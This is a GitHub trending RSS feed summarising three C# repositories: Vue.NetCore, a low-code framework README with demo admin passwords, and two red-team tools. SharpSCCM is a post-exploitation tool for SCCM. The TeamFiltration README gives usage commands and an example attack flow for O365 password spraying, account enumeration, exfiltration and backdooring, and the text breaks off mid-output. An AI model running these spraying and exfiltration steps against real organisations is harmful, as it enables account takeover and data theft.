<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-17T01:38:32Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>cq-panda/Vue.NetCore</title>
    <updated>2022-08-17T01:38:32Z</updated>
    <id>tag:github.com,2022-08-17:/cq-panda/Vue.NetCore</id>
    <link href="https://github.com/cq-panda/Vue.NetCore" rel="alternate"></link>
    <summary type="html">&lt;p&gt;.NetCore+Vue2/Vue3+Element plus+uniapp前后端分离，全自动生成代码；支持移动端(uniapp)ios/android/h5/微信小程序。http://www.volcore.xyz/&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Vue + .NetCore前后端分离，不一样的快速发开框架(提供Vue2/Vue3版本)&lt;/h2&gt; &#xA;&lt;h2&gt;框架核心&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;快速开发(基础功能全部由代码生成器生成)&lt;/li&gt; &#xA; &lt;li&gt;支持前端、后台自定义业务代码扩展,后台提供了大量常用扩展与通用类&lt;/li&gt; &#xA; &lt;li&gt;前端、后台提供了近300个扩展方法与属性,开发人员可在此功能上编写扩展自定义业务代码&lt;/li&gt; &#xA; &lt;li&gt;代码生成(代码生成器可直接生成主/从表前后端业务代码,有30多种属性可在线配置生成的代码)&lt;/li&gt; &#xA; &lt;li&gt;前端table自动转换key/value&lt;/li&gt; &#xA; &lt;li&gt;前端表单select/checkbox自动绑定数据源,不需要写任何代码&lt;/li&gt; &#xA; &lt;li&gt;支持(主从表)一对一前后端代码全自动生成、并支持数据源自动绑定与业务代码扩展,不需要写任何代码&lt;/li&gt; &#xA; &lt;li&gt;支持一对多从表自定义扩展(不限从表类型与从表数量) , 一对多从表使用扩展可轻松实现&lt;/li&gt; &#xA; &lt;li&gt;如果能上手框架，可以体会到不用996,更不用掉头发的感觉^_^&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;框架适用范围&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;前后端分离项目&lt;/li&gt; &#xA; &lt;li&gt;编写各种后台restful api接口。后台基础代码由代码生成器完成,在生成的代码上继续编写业务即可&lt;/li&gt; &#xA; &lt;li&gt;前端表单开发(直接上手看demo即可)&lt;/li&gt; &#xA; &lt;li&gt;配合app做H5或全h5开发&lt;/li&gt; &#xA; &lt;li&gt;移动端开发、app、微信小程序(uniapp)，见下面介绍&lt;/li&gt; &#xA; &lt;li&gt;在现有的代码生成器功能上，继续定制开发代码生成器功能,解决重复性工作&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;框架开发依赖环境&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;后台：VS2019、vs2022 、.NetCore3.1 、.Net6、EFCore3.1/6.0、JWT、Dapper、signalR、Autofac、SqlServer/MySql/PGSql/Oracle、Redis(可选,默认使用内置IMemory)&lt;/li&gt; &#xA; &lt;li&gt;前端：VsCode、Vue2/vue3（webpack、node.js,如果没有此环境自行搜索:vue webpack npm)、vuex、axios、promise、iview、element-ui&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;https://www.cctalk.com/m/group/90268531&#34;&gt;vol框架视频&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;https://space.bilibili.com/525836469&#34;&gt;NET视频教程(微软MVP-ACE录制)&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;项目启动与上手&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://v2.volcore.xyz/document/guide&#34;&gt;http://v2.volcore.xyz/document/guide&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;vue2版本&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://v2.volcore.xyz&#34;&gt;http://v2.volcore.xyz&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;vue3版本&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://www.volcore.xyz&#34;&gt;http://www.volcore.xyz&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;演示地址2&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://120.48.115.252:9990/&#34;&gt;http://120.48.115.252:9990/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;App/H5开发&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://v2.volcore.xyz/app/guide&#34;&gt;http://v2.volcore.xyz/app/guide&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;框架移动端（uniapp）已发布,同样全自动生成代码&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/qrcode.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/m001.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/m002.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;框架已支持Vue3版本&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/v3.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;框架已增加低代码设计器&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/fd01.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/fd02.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;框架2.0已更新(部分新增功能截图)&lt;/h2&gt; &#xA;&lt;p&gt;增加切换皮肤功能 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/h.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/home_them.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; 增加可复用的后台请求参数校验 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/validator.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; 增加树形菜单与代码生成页面使用 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/x7tree.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; 增加文本编辑器直接发布静态页面功能 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/editor.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; 一对一多从表显示(只需要少量代码就可完成成，其他都由代码生成器生成) &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/m1.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; 表合并显示 (只需要几行代码完成代码生成器生成的页面实现扩展) &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/span.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; 从图上传图片 (只需要几行代码完成代码生成器生成的页面实现扩展) &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/p1.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; 一对多从表(不限从表数量)扩展 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/multi.png&#34; alt=&#34;Home&#34;&gt;&lt;br&gt; 图表 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/charts.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;1、只读基础表单&lt;/h2&gt; &#xA;&lt;p&gt;整个只读的基础表单的所有前后端代码，全部由代码生成器生成，代码生成器中几乎不需要配置，并支持并后端业务代码扩展，直接生成代码后，配置菜单权限即可 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/table1.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;2、自动绑定下拉框数据表单&lt;/h2&gt; &#xA;&lt;p&gt;整个自动绑定下拉框数据表单的所有前后端代码，全部由代码生成器生成，并支持并后端业务代码扩展，在代码生成器中只需要指定数据源编号，页面加载时会根据编号自动加载数据源并绑定&lt;br&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/table2.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;3、启用图片支持、审核表单&lt;/h2&gt; &#xA;&lt;p&gt;整个启用图片支持、审核表单的所有前后端代码，全部由代码生成器生成，并支持并后端业务代码扩展，审核功能需要在菜单配置权限、代码生成器中勾选启用图片支持 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/table3.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;4、高级查询&lt;/h2&gt; &#xA;&lt;p&gt;整个表单的所有前后端代码，全部由代码生成器生成，并支持并后端业务代码扩展，查询字段、类型(下拉框、日期、TextArea等)、所在行与列都由代码生成器完成，不需要写任何代码&lt;br&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/tablesearch4.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;5、主从表新建、编辑&lt;/h2&gt; &#xA;&lt;p&gt;主从表新建、编辑所有前后端代码，全部由代码生成器生成，并支持并后端业务代码扩展，新建、编辑从表配置、字段、类型(下拉框、日期、TextArea等)、所在行与列、字段是否只读、标签显示的长度等都由代码生成器完成，不需要写任何代码&lt;br&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/editTbale2.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;6、excel导入&lt;/h2&gt; &#xA;&lt;p&gt;excel导入整个页面都由代码生成器生成，导入的字段、字段是否必填，下载模板也由代码生成器上配置(自己根据实际需要决定是否采用此方法)，导入时会验证是否为空与数据的合法性，逻辑校验自己实现扩展方法即可&lt;br&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/importTable1.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;7、H5开发&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/h5.jpg&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;8、权限分配&lt;/h2&gt; &#xA;&lt;p&gt;目前只实现了对用户的角色的Action进行权限分配 &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/auth.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;9、代码生成器&lt;/h2&gt; &#xA;&lt;p&gt;代码生成器提供了20多种可配置的属性，可灵活配置显示、查询、编辑、导入、导出、主从关系等功能&lt;a href=&#34;http://132.232.2.109/document/coder&#34;&gt;点击看代码生成器文档&lt;/a&gt; &lt;img src=&#34;https://github.com/cq-panda/Vue.NetCore/raw/master/imgs/coder.png&#34; alt=&#34;Home&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;其他功能。。。。。&lt;/p&gt; &#xA;&lt;h2&gt;框架预览&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;框架内置了大量的通用组件可直接使用,并内置了基于本框架定制开发的代码生成器，尽量避免重复性代码编写。&lt;/li&gt; &#xA; &lt;li&gt;框架不仅仅是快速开发，更多的是倾向于业务代码扩展的编写与代码规范。&lt;/li&gt; &#xA; &lt;li&gt;如果有什么问题或建议，提issue或加QQ：283591387&lt;/li&gt; &#xA; &lt;li&gt;QQ1群：45221949&lt;/li&gt; &#xA; &lt;li&gt;QQ2群：913189178&lt;/li&gt; &#xA; &lt;li&gt;&lt;/li&gt; &#xA; &lt;li&gt;vue3地址：&lt;a href=&#34;http://www.volcore.xyz&#34;&gt;http://www.volcore.xyz&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;vue2地址：&lt;a href=&#34;http://v2.volcore.xyz&#34;&gt;http://v2.volcore.xyz&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;帐号：admin666密码：123456（本地超级管理员帐号：admin密码123456)&lt;/li&gt; &#xA; &lt;li&gt;github地址：&lt;a href=&#34;https://github.com/cq-panda/vue.netcore&#34;&gt;https://github.com/cq-panda/vue.netcore&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;gitee码云：&lt;a href=&#34;https://gitee.com/x_discoverer/Vue.NetCore&#34;&gt;https://gitee.com/x_discoverer/Vue.NetCore&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;框架文档：&lt;a href=&#34;http://v2.volcore.xyz/document/guide&#34;&gt;http://v2.volcore.xyz/document/guide&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;框架更新日志：&lt;a href=&#34;http://v2.volcore.xyz/document/log&#34;&gt;http://v2.volcore.xyz/document/log&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>Mayyhem/SharpSCCM</title>
    <updated>2022-08-17T01:38:32Z</updated>
    <id>tag:github.com,2022-08-17:/Mayyhem/SharpSCCM</id>
    <link href="https://github.com/Mayyhem/SharpSCCM" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A C# utility for interacting with SCCM&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Tool Overview&lt;/h1&gt; &#xA;&lt;p&gt;SharpSCCM is a post-exploitation tool designed to leverage Microsoft Endpoint Configuration Manager (a.k.a. ConfigMgr, formerly SCCM) for lateral movement and credential gathering without requiring access to the SCCM administration console GUI.&lt;/p&gt; &#xA;&lt;p&gt;SharpSCCM was initially created to execute user hunting and lateral movement functions ported from PowerSCCM (by @harmj0y, @jaredcatkinson, @enigma0x3, and @mattifestation) and now contains additional functionality to gather credentials and abuse newly discovered attack primitives for coercing NTLM authentication in SCCM sites where automatic site-wide client push installation is enabled.&lt;/p&gt; &#xA;&lt;p&gt;Please &lt;a href=&#34;https://github.com/Mayyhem/SharpSCCM/wiki&#34;&gt;visit the wiki&lt;/a&gt; for documentation detailing how to build and use SharpSCCM.&lt;/p&gt; &#xA;&lt;h3&gt;Author&lt;/h3&gt; &#xA;&lt;p&gt;Chris Thompson is the primary author of this project. Duane Michael (@subat0mik) and Evan McBroom (@mcbroom_evan) are active contributors as well. Please feel free to reach out on Twitter (@_Mayyhem) with questions, ideas for improvements, etc., and on GitHub with issues and pull requests.&lt;/p&gt; &#xA;&lt;h3&gt;Warning&lt;/h3&gt; &#xA;&lt;p&gt;This tool was written as a proof of concept in a lab environment and has not been thoroughly tested. There are lots of unfinished bits, terrible error handling, and functions I may never complete. Please be careful and use at your own risk.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Flangvik/TeamFiltration</title>
    <updated>2022-08-17T01:38:32Z</updated>
    <id>tag:github.com,2022-08-17:/Flangvik/TeamFiltration</id>
    <link href="https://github.com/Flangvik/TeamFiltration" rel="alternate"></link>
    <summary type="html">&lt;p&gt;TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;TeamFiltration&lt;/h2&gt; &#xA;&lt;p&gt;TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts. &lt;strong&gt;See the &lt;a href=&#34;https://raw.githubusercontent.com/Flangvik/TeamFiltration/main/#example-attack-flow&#34;&gt;Example Attack flow&lt;/a&gt; at the bottom of this readme for a general introduction into how TeamFiltration works!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;This tool has been used internally since January 2021 and was publicly released in my talk &#34;Taking a Dumb In The Cloud&#34; during DefCON30.&lt;/p&gt; &#xA;&lt;p&gt;You will need to provide a json config file to be able to use TeamFiltration. This configuration file contains information such as PushoverAPI keys, Dehashed API keys, Fireprox endpoints URL and much more. Please see the &lt;a href=&#34;https://raw.githubusercontent.com/Flangvik/TeamFiltration/main/#TeamFiltration-Configruation&#34;&gt;guide further down&lt;/a&gt; on how to create your own config.&lt;/p&gt; &#xA;&lt;h2&gt;Download&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Flangvik/TeamFiltration/releases/latest&#34;&gt;You can download the latest precompiled release for Linux, Windows and MacOSX X64 &lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;The releases are precompiled into a single application-dependent binary. The size go up, but you do not need DotNetCore or any other dependencies to run them.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;FAQ&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You cannot run multiple instances of TeamFiltration with the same --outpath, this will cause a LiteDB file write collision!&lt;/li&gt; &#xA; &lt;li&gt;--outpath is mandatory and needs to be supplied for each module&lt;/li&gt; &#xA; &lt;li&gt;--outpath is client specific across all modules&lt;/li&gt; &#xA; &lt;li&gt;--outpath IS A FOLDER PATH, not a file.&lt;/li&gt; &#xA; &lt;li&gt;Question or bug? Hit me up on Twitter or create an issue&lt;/li&gt; &#xA; &lt;li&gt;For pushover to work, you need to specify both --pushover when starting a password spray&lt;/li&gt; &#xA; &lt;li&gt;In order to use the --validate-teams enumeration method you need to provide sacrificial Office 365 user account (sacrificialO365Username and sacrificialO365Password in the config file)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#xA;  ╔╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╗&#xA; ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬&#xA;╬╬╬╬┤                              ╠╬╬╝╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬&#xA;╬╬╬╬╣                              │      ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬&#xA;╬╬╬╬╣                              ││      ╚╬╬╝╚ └╚╝╬╬╬╬╬╬&#xA;╬╬╬╬╣         ╔╦╦╬╬╬╬╬╬╦╦╗         ││       │        ╬╬╬╬╬&#xA;╬╬╬╬╣     ╔╬╬╬╝╝┘      ╚╝╝╬╬╬┐     ││       ││       └╬╬╬╬&#xA;╬╬╬╬┤    ╬╬╝╚╩╬╗╔          ╚╬╬╬    ││       ││        ╬╬╬╬&#xA;╬╬╬╬┤   ╬╝      ╚╬╬╗╗ ╔      ╚╬╗   ││      ├││        ╬╬╬╬&#xA;╬╬╬╬┤  ╬╬     ╔╗   ╚╬╬╬╬╬╬╦    ╬╬  │┌    ╔╬┤││       ╔╬╬╬╬&#xA;╬╬╬╬┤ ╔╬┤     ╬╬╬   ╬╬╬╬╬╬╬╬╝╝╝╬╬╗ ╠╬╬╬╬╬╬╬╬╬╗      ┌╬╬╬╬╬&#xA;╬╬╬╬┤ ╬╬┤     ╚╩┘   ╚╬╬╬╬╬╩    ╠╬╬ ╚╝╝╝╝╝╝╝╝╝╬╬╗╗╗╦╬╬╬╬╬╬╬&#xA;╬╬╬╬┤ ╬╬┤                      ╠╬╬ ││         ╬╬╬╬╬╬╬╬╬╬╬╬&#xA;╬╬╬╬┤  ╬╬   ╦╗            ╗╗   ╬╬  ││         │       ╬╬╬╬&#xA;╬╬╬╬┤  └╬┐   ╚╬╗╗      ╔╬╬╝   ╔╬┘  ││         │       ╬╬╬╬&#xA;╬╬╬╬┤   └╬╗    ╚╩╩╬╬╬╩╩╝╝   ╔╬╬    ││         │       ╬╬╬╬&#xA;╬╬╬╬┤    ╚╬╬╬╗           ┌╗╬╬╝┘    ││         │       ╬╬╬╬&#xA;╬╬╬╬┤       ╚╩╬╬╬╦╦╦╦╦╦╬╬╬╝╝       ││         │       ╬╬╬╬&#xA;╬╬╬╬┤            ╚╚╝╝╝╝            ││         │       ╬╬╬╬&#xA;╬╬╬╬┤                              ││         │    ╔╗╬╬╬╬╬&#xA;╬╬╬╬┤                              ││         ╬╦╦╬╬╬╬╬╬╬╬╬&#xA;╬╬╬╬┤                              ││     ╔╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬&#xA;╬╬╬╬┤                              ╬╬╬╗╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬&#xA;╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬&#xA; └╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╝&#xA;   ╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝╝&#xA;&#xA;[+] TeamFiltration V0.3.3.6 PUBLIC, created by @Flangvik @TrustedSec&#xA;Usage:&#xA;&#xA;   --outpath     Output path to store database and exfiltrated information (Needed for all modules)&#xA;&#xA;   --config      Local path to your TeamFiltration.json configuration file, if not provided will load from current path&#xA;&#xA;   --exfil       Load the exfiltration module  &#xA;&#xA;         --username            Override to target a given username that does not exist in the database&#xA;         --password            Override to target a given password that does not exist in the database&#xA;         --cookie-dump         Override to target a given account using it&#39;s refresk-cookie-collection&#xA;&#xA;         --all                 Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)&#xA;         --aad                 Exfiltrate information from Graph API (domain users and groups)&#xA;         --teams               Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)&#xA;         --onedrive            Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the users entire OneDrive directory)&#xA;         --owa                 Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received) &#xA;               --owa-limit     Set the max amount of emails to exfiltrate, default is 2k.&#xA;         --jwt-tokens              Exfiltrate JSON formated JTW-tokens for SSO resources (MsGraph,AdGraph, Outlook, SharePoint, OneDrive, Teams)&#xA;&#xA;   --spray       Load the spraying module&#xA;&#xA;         --aad-sso             Use SecureWorks recent Azure Active Directory password brute-forcing vuln for spraying&#xA;         --us-cloud            When spraying companies attached to US Tenants (https://login.microsoftonline.us/)&#xA;         --time-window         Defines a time windows where spraying should accour, in the military time format &amp;lt;12:00-19:00&amp;gt;&#xA;         --passwords           Path to a list of passwords, common weak-passwords will be generated if not supplied&#xA;         --seasons-only        Password generated for spraying will only be based on seasons&#xA;         --months-only         Password generated for spraying will only be based on months&#xA;         --common-only         Spray with the top 20 most common passwords&#xA;         --combo               Path to a combolist of username:password&#xA;         --exlude              Path to a list of emails to exclude from spraying&#xA;&#xA;         --sleep-min           Minimum minutes to sleep between each full rotation of spraying default=60&#xA;         --sleep-max           Maximum minutes to sleep between each full rotation of spraying default=100&#xA;         --delay               Delay in seconds between each individual authentication attempt. default=0&#xA;         --push-userkey        Pushover user API key for notifications when credentials are found)&#xA;         --push-appkey         Pushover app API key for notifications when credentials are found)&#xA;         --push-locked         Get Pushover notifications when an sprayed account gets locked (requires --push-userkey and --push-appkey)&#xA;         --force               Force the spraying to proceed even if there is less the &amp;lt;sleep&amp;gt; time since the last attempt&#xA;&#xA;   --enum        Load the enumeration module&#xA;&#xA;         --domain              Domain to perfom enumeration against, names pulled from statistically-likely-usernames if not provided with --usernames&#xA;         --usernames           Path to a list of usernames to enumerate (emails)&#xA;         --dehashed            Use the dehashed submodule in order to enumerate emails from a basedomain&#xA;         --validate-msol       Validate that the given o365 accounts exists using the public GetCredentialType method (Very RateLimited - Slow 20 e/s)&#xA;         --validate-teams      Validate that the given o365 accounts exists using the Teams API method (Recommended - Super Fast 300 e/s)&#xA;         --validate-login      Validate that the given o365 accounts by attemping to login (Noisy - triggers logins - Fast 100 e/s)&#xA;&#xA;   --backdoor        Loads the interactive backdoor module&#xA;&#xA;   --database        Loads the interactive database browser module&#xA;&#xA;   --debug           Add burp as a proxy on 127.0.0.1:8080&#xA;&#xA;   Examples:&#xA;&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push-userkey XXX --push-appkey XXX&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --push-userkey XXX --push-appkey XXX --push-locked --months-only --exlude C:\Clients\2021\FooBar\Exclude_Emails.txt&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --all &#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --aad  &#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --enum --validate-teams&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --backdoor&#xA;        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --database&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Example Attack Flow&lt;/h2&gt; &#xA;&lt;p&gt;Start the external by performing recon using Dehashed, Linkedin, Hunter.io, Google Dorks etc. When you figured out what the email syntax for the company is, you are ready to enumerate and validate emails that exists within the target o365 tenant&lt;/p&gt; &#xA;&lt;p&gt;The --outpath is needed for all modules within TeamFiltration, and acts as a localised workspace / project folder for all information related to this attack/client to be stored&lt;/p&gt; &#xA;&lt;p&gt;Start the enum with the following command, where --domain is your target client domain name&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt; TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Choose the enumerated email syntax. This will pull different emails and syntaxes from the statistically likely usernames repo. Once you select a syntax, TeamFiltration will use its private, passive and unsaturated Teams method to validate them (hence the --validate-teams argument)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[♥] TeamFiltration V0.3.2.6, created by @Flangvik&#xA;[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net&#xA;[+] No usernames list provided, pulling statistically-likely-usernames&#xA;[?] Provide a target domain/tenant (e.g legitcorp.net) #&amp;gt; legitcorp.net&#xA;    |=&amp;gt; [1] john.smith@legitcorp.net&#xA;    |=&amp;gt; [2] john@legitcorp.net&#xA;    |=&amp;gt; [3] johnjs@legitcorp.net&#xA;    |=&amp;gt; [4] johns@legitcorp.net&#xA;    |=&amp;gt; [5] johnsmith@legitcorp.net&#xA;    |=&amp;gt; [6] jsmith@legitcorp.net&#xA;    |=&amp;gt; [7] smith@legitcorp.net&#xA;    |=&amp;gt; [8] smithj@legitcorp.net&#xA;    |=&amp;gt; [9] john_smith@legitcorp.net&#xA;&#xA;[?] Select an email format #&amp;gt; 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you would like to supply your own email list to validate, simply use the --usernames argument. Validated emails get stored automatically in the TeamFiltration.db file located in the --outpath folder. This way, there is no need to supply data manually through each module.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[ENUM] 24.05.2021 12:31:05 EST Filtering out previusly attempted accounts&#xA;[ENUM] 24.05.2021 12:31:06 EST Enumerating 248231 possible accounts, this will take ~14 minutes&#xA;[ENUM] 24.05.2021 12:31:07 EST Successfully got Teams token for sacrificial account&#xA;[ENUM] 24.05.2021 12:31:07 EST Loaded 248231 usernames&#xA;[ENUM] 24.05.2021 12:31:08 EST enita.lintz@legitcorp.net valid!&#xA;[ENUM] 24.05.2021 12:31:09 EST bruce.wayne@legitcorp.net valid!&#xA;[ENUM] 24.05.2021 12:31:13 EST herminia.oliva@legitcorp.net valid!&#xA;[ENUM] 24.05.2021 12:31:13 EST thomas.anderson@legitcorp.net valid!&#xA;[ENUM] 24.05.2021 12:31:17 EST sharilyn.penning@legitcorp.net 